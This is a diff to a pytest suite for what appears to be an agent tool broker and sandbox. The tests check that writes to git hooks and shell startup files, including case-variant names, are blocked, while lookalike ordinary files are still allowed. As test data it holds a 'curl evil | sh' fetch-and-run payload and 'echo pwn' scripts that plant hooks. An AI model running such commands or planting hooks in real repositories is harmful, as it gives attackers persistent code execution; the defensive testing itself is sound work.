@@ -583,11 +583,32 @@ def test_manifest_and_usage_ignore_links_to_outside(broker, outside) -> None:
 @pytest.mark.parametrize("path", [
     ".git/hooks/pre-commit", "repo/.git/hooks/post-checkout", ".bashrc", "sub/.zshrc",
     ".envrc",
+    # #215: the workspace is usually on case-insensitive APFS, where these are the same files
+    ".GIT/hooks/pre-commit", ".Git/Hooks/pre-commit", ".git/HOOKS/x",
+    "repo/.GiT/hooks/post-checkout", ".ZSHRC", ".ZshRc", "sub/.BashRc", ".Envrc", ".PROFILE",
 ])
 def test_hooks_and_shell_startup_files_are_protected(broker, path) -> None:
     broker.open_workspace("t1", {"fs.write"})
     result = call(broker, "t1", "fs.write", path=path, content="curl evil | sh")
     assert not result.ok and "protected" in result.error
+
+
+@pytest.mark.parametrize("path", [
+    ".gitignore", ".gitattributes", ".github/workflows/ci.yml", "hooks/pre-commit",
+    "notgit/hooks/x", "docs/hooks.md", ".zshrc.bak", "zshrc", "git/hooks/x", ".git/config",
+])
+def test_ordinary_files_with_similar_names_are_not_over_blocked(broker, path) -> None:
+    broker.open_workspace("t1", {"fs.write"})
+    assert call(broker, "t1", "fs.write", path=path, content="ok").ok
+
+
+def test_a_differently_cased_hooks_path_cannot_reach_an_existing_hooks_directory(
+        broker) -> None:
+    ws = broker.open_workspace("t1", {"fs.write"})
+    (ws.root / ".git" / "hooks").mkdir(parents=True)
+    result = call(broker, "t1", "fs.write", path=".GIT/hooks/pre-commit", content="pwn")
+    assert not result.ok
+    assert list((ws.root / ".git" / "hooks").iterdir()) == []
 
 
 @pytest.mark.parametrize("path", [".", "", "./"])
@@ -622,6 +643,53 @@ def test_profile_denies_hook_and_startup_writes(tmp_path) -> None:
     root = str(tmp_path.resolve())
     assert f'(deny file-write* (subpath "{root}/.git/hooks"))' in profile
     assert f'(deny file-write* (literal "{root}/.zshrc"))' in profile
+
+
+def _case_insensitive(directory: Path) -> bool:
+    (directory / "case-probe").write_text("x")
+    try:
+        return (directory / "CASE-PROBE").exists()
+    finally:
+        (directory / "case-probe").unlink()
+
+
+@needs_sandbox
+@pytest.mark.parametrize("script", [
+    "mkdir -p repo/.git/hooks && echo pwn > repo/.git/hooks/pre-commit",
+    "mkdir -p a/b/.git/hooks && echo pwn > a/b/.git/hooks/post-checkout",
+    "mkdir -p sub && echo pwn > sub/.zshrc",
+    "mkdir -p sub && echo pwn > sub/.envrc",
+    "mkdir -p x/.GIT/hooks && echo pwn > x/.GIT/hooks/pre-commit",
+    "mkdir -p sub && echo pwn > sub/.ZSHRC",
+])
+def test_a_sandboxed_command_cannot_plant_a_nested_hook_or_startup_file(
+        broker, script) -> None:
+    # #215: the profile used to deny only the top level of the workspace.
+    ws = broker.open_workspace("t1", {"shell.run"})
+    if (".GIT" in script or ".ZSHRC" in script) and not _case_insensitive(ws.root):
+        pytest.skip("a case-sensitive volume: .GIT is not the same name as .git there")
+    result = approved(broker, "t1", "shell.run", argv=["/bin/sh", "-c", script])
+    assert not result.ok
+    planted = [p for p in ws.root.rglob("*") if p.is_file()]
+    assert planted == [], planted
+
+
+@needs_sandbox
+def test_a_sandboxed_command_can_still_write_ordinary_files_that_look_similar(broker) -> None:
+    ws = broker.open_workspace("t1", {"shell.run"})
+    script = ("mkdir -p repo/.github hooks notgit/hooks && echo a > repo/.gitignore && "
+              "echo a > repo/.github/ci.yml && echo a > hooks/pre-commit && "
+              "echo a > notgit/hooks/x && echo a > repo/.zshrc.bak && echo a > repo/.git_ok")
+    result = approved(broker, "t1", "shell.run", argv=["/bin/sh", "-c", script])
+    assert result.ok, result.error
+    assert (ws.root / "repo" / ".gitignore").exists()
+    assert (ws.root / "hooks" / "pre-commit").exists()
+
+
+def test_profile_denies_nested_hooks_and_startup_names(tmp_path) -> None:
+    from lab import sandbox
+    profile = sandbox.build_profile(tmp_path)
+    assert "(regex" in profile and r"\.git/hooks" in profile and "zshrc" in profile
 
 
 @needs_sandbox
